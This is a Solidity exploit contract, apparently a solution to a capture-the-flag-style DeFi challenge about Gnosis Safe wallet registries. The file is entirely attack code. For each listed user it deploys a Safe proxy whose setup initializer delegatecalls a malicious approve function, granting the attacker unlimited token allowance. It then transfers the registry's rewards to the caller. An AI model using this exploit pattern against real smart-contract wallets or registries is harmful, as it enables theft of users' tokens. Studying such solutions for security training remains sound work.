// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";

contract BackdoorAttack{

    address immutable singleton;
    IERC20 immutable token;
    GnosisSafeProxyFactory immutable factory;
    IProxyCreationCallback immutable registry;

    constructor(
        address _singleton,
        address _token,
        address _factory,
        address _registry
    ) {
        singleton = _singleton;
        token = IERC20(_token);
        factory = GnosisSafeProxyFactory(_factory);
        registry = IProxyCreationCallback(_registry);
    }

    //approve function for the delegatecall
    function approve(address _user, uint256 _amount) external {
        token.approve(_user, _amount);
    }

    //action
    function attack(address[] calldata _users, uint _amount) external {

        //create array for the wallets
        for (uint256 i; i < _users.length; ++i){
            address[] memory wallets = new address[](1);

            wallets[0] = _users[i];
        

        //create a approve payload
        bytes memory _approvePayload = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);

        //create the setup for initializer
        bytes memory setup = abi.encodeWithSelector(
            GnosisSafe.setup.selector,
            wallets, 
            uint(1), 
            address(this), 
            _approvePayload, 
            address(0), 
            address(0), 
            uint(0), 
            address(0)
            );

        //create a proxy and trigger delegatecall
        GnosisSafeProxy proxy = factory.createProxyWithCallback(
            singleton, 
            setup, 
            block.timestamp, 
            registry);

        //transfer tokens for proxy
        token.transferFrom(address(proxy), msg.sender, _amount);
        }
    }
}